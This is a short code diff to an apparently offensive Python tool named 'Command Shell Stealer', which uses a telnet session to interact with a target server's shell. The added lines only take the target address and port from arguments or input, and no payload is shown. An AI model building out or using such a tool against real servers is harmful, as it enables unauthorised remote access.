@@ -33,6 +33,21 @@ def interact(targetServer):
     telnetConnection.sock = targetServer
     telnetConnection.interact()
 
-# Program Banner
+# Program banner
 print('Command Shell Stealer')
 print('Exploitation')
+
+# Target server address and port input
+try:
+    targetServerAddress = sys.argv[1]
+    print('* Target server address is '+targetServerAddress)
+except IndexError:
+    print('@ Input target server address')
+    targetServerAddress = input('> ')
+
+try:
+    targetServerPort = sys.argv[2]
+    print('* Target server port is '+targetServerPort)
+except IndexError:
+    print('@ Input target server port')
+    targetServerPort = input('> ')
